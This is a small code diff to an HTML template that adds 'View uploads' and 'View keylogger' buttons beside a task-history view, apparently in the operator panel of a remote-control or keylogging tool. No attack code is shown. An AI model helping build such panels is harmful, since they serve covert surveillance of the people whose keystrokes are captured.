@@ -21,6 +21,12 @@
       <form action="status">
         <input type="submit" value="View task history" class="login-submit" />
       </form>
+      <form action="uploads">
+        <input type="submit" value="View uploads" class="login-submit" />
+      </form>
+      <form action="keylogger">
+        <input type="submit" value="View keylogger" class="login-submit" />
+      </form>
       {% for i in range(0, 5)%}
         {% if recentTasks %}
           <li>{{ recentTasks[i] }}</li>
